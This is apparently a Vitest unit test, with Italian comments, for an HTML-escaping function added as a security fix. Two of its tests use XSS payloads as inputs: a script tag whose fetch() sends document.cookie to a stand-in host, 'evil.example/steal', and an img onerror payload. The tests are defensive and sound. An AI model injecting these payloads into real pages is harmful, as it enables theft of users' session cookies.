/**
 * Test per shared/src/utils/html.ts (escapeHtml), fix 0.9.1 SEC-008.
 *
 * Vive qui e non dentro shared/src/ perché la config vitest di
 * frontend/ (vite.config.ts) non ha un `include` esteso fuori da
 * `root` (frontend/) — un file .test.ts dentro shared/src/ non
 * verrebbe raccolto da `npm run test:run`. Stesso vincolo vale per
 * frontend-portal/. Import via alias @shared, come nel resto del
 * progetto.
 */
import { describe, expect, it } from 'vitest'
import { escapeHtml } from '@shared/utils/html'

describe('escapeHtml', () => {
  it("esegue l'escape dei 5 caratteri HTML pericolosi", () => {
    expect(escapeHtml('&')).toBe('&amp;')
    expect(escapeHtml('<')).toBe('&lt;')
    expect(escapeHtml('>')).toBe('&gt;')
    expect(escapeHtml('"')).toBe('&quot;')
    expect(escapeHtml("'")).toBe('&#39;')
  })

  it('neutralizza un payload script tag realistico (SEC-008)', () => {
    const payload = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
    const escaped = escapeHtml(payload)
    expect(escaped).not.toContain('<script>')
    expect(escaped).toBe(
      '&lt;script&gt;fetch(&quot;https://evil.example/steal?c=&quot;+document.cookie)&lt;/script&gt;',
    )
  })

  it('neutralizza un payload img onerror', () => {
    const payload = '<img src=x onerror="alert(document.cookie)">'
    const escaped = escapeHtml(payload)
    expect(escaped).not.toContain('<img')
    expect(escaped).not.toMatch(/onerror\s*=\s*"/)
  })

  it('preserva il testo normale invariato', () => {
    expect(escapeHtml('Manutenzione ordinaria - OK')).toBe('Manutenzione ordinaria - OK')
  })

  it('restituisce stringa vuota per null/undefined, senza lanciare', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })

  it('converte i numeri in stringa', () => {
    expect(escapeHtml(42)).toBe('42')
    expect(escapeHtml(0)).toBe('0')
  })
})
